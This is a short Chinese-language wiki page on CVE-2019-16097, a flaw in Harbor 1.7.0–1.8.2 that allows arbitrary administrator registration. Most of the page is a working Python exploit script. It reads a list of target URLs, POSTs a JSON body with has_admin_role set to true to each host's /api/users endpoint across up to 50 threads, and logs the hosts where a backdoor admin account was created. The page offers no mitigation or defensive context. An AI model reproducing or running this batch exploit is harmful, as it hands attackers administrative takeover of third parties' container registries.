---
title: Harbor  CVE-2019-16097 任意管理员注册漏洞
description: 
published: true
date: 2025-07-05T00:25:34.481Z
tags: 
editor: markdown
dateCreated: 2025-07-05T00:25:34.481Z
---

# CVE-2019-16097 任意管理员注册漏洞
## 影响范围 

```http
Harbor 1.7.0-1.8.2  
```

## POC

```bash
Goby
```

## EXP

url.txt为待检测IP，Result为漏洞IP、新建管理员账户、新建管理员密码  
```python
import requests
import threading
import logging

data='{"username":"biubiubiu","email":"biubiubiu11@qq.com","realname":"biubiu1biu","password":"Aa111111","comment":"biubiubiu","has_admin_role":true}'

headers={"Content-Type": "application/json"}


def poc(url):
    pwn_url=url+"/api/users"
    payload=data
    try:
        r=requests.post(pwn_url, data=payload,headers=headers,timeout=10)
        print(pwn_url)
        print(r.status_code)
        if r.status_code == 201:
            print("\n\n you has created a user,username=biubiubiu,password=Aa111111")
            f.write(url+"       The URL has created a user,username=biubiubiu,password=Aa111111")
        else:
            print("The vulnerability does not exist on the website or the account name has been written")

    except Exception as e:
        logging.warning(pwn_url)
        print(e)

if __name__ == '__main__':
    print ("this is a CVE-2019-16097 poc")
    print("more cve-2019-16097 info welcome to https://www.lstazl.com")
    f=open("results.txt","a")
    url_list=[i.replace("\n","") for i in open("urls.txt","r").readlines()]
    for url in url_list:
        threading.Thread(target=poc,args=(url,)).start()
        while 1:
            if (len(threading.enumerate())<50):
                break

```

```bash
python CVE-2019-16097.py
```

[@rockmelodies](https://github.com/rockmelodies/CVE-2019-16097-batch)